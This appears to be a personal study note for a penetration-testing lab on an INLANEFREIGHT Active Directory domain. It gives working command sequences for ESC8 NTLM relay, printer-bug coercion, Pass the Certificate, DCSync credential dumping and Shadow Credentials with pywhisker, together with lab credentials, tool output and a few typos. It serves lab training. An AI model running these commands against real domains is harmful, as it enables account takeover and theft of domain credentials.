

> [!NOTE] Public Key Cryptography for Initial Authentication
> Uses public key crypt typically for user logons via smart cards, which store private keys.
>
>Pass the Cert refers to using X.509 certs to obtain TGTs.

### AD CS NTLM Relay Attack (ESC8)


> [!NOTE] ESC8
> ESC8 is an NTLM relay attack against Active Directory Certificate Services (ADCS) that targets the HTTP-based web enrollment endpoint. Because ADCS supports web enrollment over HTTP by default, a certificate authority that allows this feature exposes the `/CertSrv` application, which can be abused for NTLM relay attacks.
>
>To conduct the Pass the certificate attack, follow the below steps


##### NTLMRELAYX

> [!example] NTLMRELAYX
> Part of the Impact suite, it listens for inbound connections and relays them to web enrollment service via the following:
```go
impacket-ntlmrelayx -t http://10.129.33.137/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

| Scanning Options | Description                                                   |
| ---------------- | ------------------------------------------------------------- |
| -t http          | Points to the **ADCS web enrollment endpoint**                |
| --adcs           | Enables **Active Directory Certificate Services abuse mode**. |
| -smb3support     | Enables **SMBv2 support** in the relay server                 |
| --template       | Specifies the **certificate template** to request from ADCS   |

###### Coerce Authentication
> [!example] Coerce Authentication
> A method to coerce user authentication is to exploit the printer bug. It requires the target machine account to have the printer spooler service running
```go
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.248.139 10.10.14.64
```


###### Pass the Certificate Attack

Ensure gettgtpkinit.py is installed
```go
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
```

```go
python3 -m venv .venv
```

```go
source .venv/bin/activate
```

```go
pip3 install -r requirements.txt
```


> [!WARNING] "Error detecting the version of libcrypto"
> In case you run into this error message, download oscrypto

```go
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

###### Executing the Pass the Certificate Attack
```go
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

Once a TGT is obtained....
###### Now Perform a DCSync Attack
```go
export KRB5CCNAME=/tmp/dc.ccache
```

 ```go
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

-------------------------------
### Shadow Credentials


> [!NOTE] Shadow Credentials Attack
> [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. The attack allows a user with the `AddKeyCredentialLink` attribute to have write permissions over a user who has the `msDS-KeyCredentialLink` attribute

##### Pywhisker
> [!example] [pywhisker](https://github.com/ShutdownRepo/pywhisker)
> pywhisker executes this attack by generating a X.509 certificate and writes the public key to the victim's msDS-KeyCredentialLink attribute
```go
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

| Scanning Options | Description |
| ---------------- | ----------- |
| --dc-ip          |             |
| -d               |             |
| -u               |             |
| -p               |             |
| --target         |             |
| --action         |             |

###### Output: Note the PFX file and the password
```go
[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

##### Obtain the TGT via gettgtpkinit.py
```go
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

##### Now we can pass the ticket [[Pass the Ticket from Linux#Abusing KeyTab ccache|Reference This]] 
```go
export KRB5CCNAME=/tmp/jpinkman.ccache
````

```go
klist
```

##### User is part of the Remote Management Users group
This allows them to RDP to the machine via WinRM
```go
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```




-----------



# Questions

DC01
```go
10.129.234.174
```

CA01
```go
10.129.234.172
```

Username
```go
wwhite
```

Password
```go
package5shores_topher1
```

SSH
```go
ssh wwhite@10.129.162.58
```
#### Question 1
What are the contents of flag.txt on jpinkman's desktop?

Perform an NMAP Host scan to determine which is the server to coerce

```go
nmap -sV -A -sC -Pn 10.129.234.174 10.129.94.225 -oA results
```

>[!TIP] HARDCODE IP ADDRESSES OF THE DOMAIN AND TARGET MACHINES!
> ```shell-session
 10.129.234.174 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01


```go
python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```
![[Pasted image 20251219171110.png]]

Password
```go
v2W8NAWvyqMmyoimuSyn
```

PFX Certificate
```go
5k0H4C2e.pfx
```

Now use gettgtpkinit.py to get the TGT as the target
```go
python3 gettgtpkinit.py -cert-pfx 5k0H4C2e.pfx -pfx-pass 'v2W8NAWvyqMmyoimuSyn' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```


![[Pasted image 20251219192156.png]]

Now export the ticket
```go
export KRB5CCNAME=/tmp/jpinkman.ccache
```

```go
proxychains evil-winrm -i dc01.inlanefrieght.htb -r inlanefreight.htb
```

#### Question 2
What are the contents of the flag.txt on Administrators desktop?
```go

```

```asciinema
/password_cracking.cast
autoPlay: true
loop: true
speed: 1.5
theme: solarized-dark
```
